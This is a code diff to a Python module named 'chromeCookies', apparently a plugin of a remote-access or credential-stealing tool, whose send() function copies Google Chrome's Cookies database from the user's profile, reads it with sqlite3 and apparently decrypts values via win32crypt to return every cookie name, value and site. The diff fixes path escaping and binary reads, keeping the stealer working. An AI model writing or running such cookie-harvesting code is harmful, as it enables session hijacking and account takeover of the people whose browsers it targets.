@@ -3,10 +3,10 @@ __name__ = "chromeCookies"
 __desc__ = "Retrieve all Cookies of Google Chrome"
 def send():
     import os, sqlite3, win32crypt, shutil
-    sourceFileWithLogin = "%s\Google\Chrome\User Data\Profile 1\Cookies" % os.getenv("localappdata")
-    sourceFileWithoutLogin = "%s\Google\Chrome\User Data\Default\Cookies" % os.getenv("localappdata")
+    sourceFileWithLogin = "%s\\Google\\Chrome\\User Data\\Profile 1\\Cookies" % os.getenv("localappdata")
+    sourceFileWithoutLogin = "%s\\Google\\Chrome\\User Data\\Default\\Cookies" % os.getenv("localappdata")
     def get(sourceFile):
-        targetFile = "%s\TempData_CO" % os.getenv("localappdata")
+        targetFile = "%s\\TempData_CO" % os.getenv("localappdata")
         result = "<Name>:<Value> (Site)\n"
         shutil.copy(sourceFile, targetFile)
         connection = sqlite3.connect(targetFile)
@@ -24,12 +24,12 @@ def send():
         os.remove(targetFile)
         return result
     if os.path.exists(sourceFileWithoutLogin) and \
-        len(open(sourceFileWithoutLogin.replace("Cookies", "Login Data")).readlines()) == 0 and \
+        len(open(sourceFileWithoutLogin.replace("Cookies", "Login Data"), 'rb').readlines()) == 0 and \
         os.path.exists(sourceFileWithLogin):
         return get(sourceFileWithLogin)
     else:
         if os.path.exists(sourceFileWithoutLogin) and \
-            not len(open(sourceFileWithoutLogin.replace("Cookies", "Login Data")).readlines()) == 0:
+            not len(open(sourceFileWithoutLogin.replace("Cookies", "Login Data"), 'rb').readlines()) == 0:
             return get(sourceFileWithoutLogin)
         else:
             pass
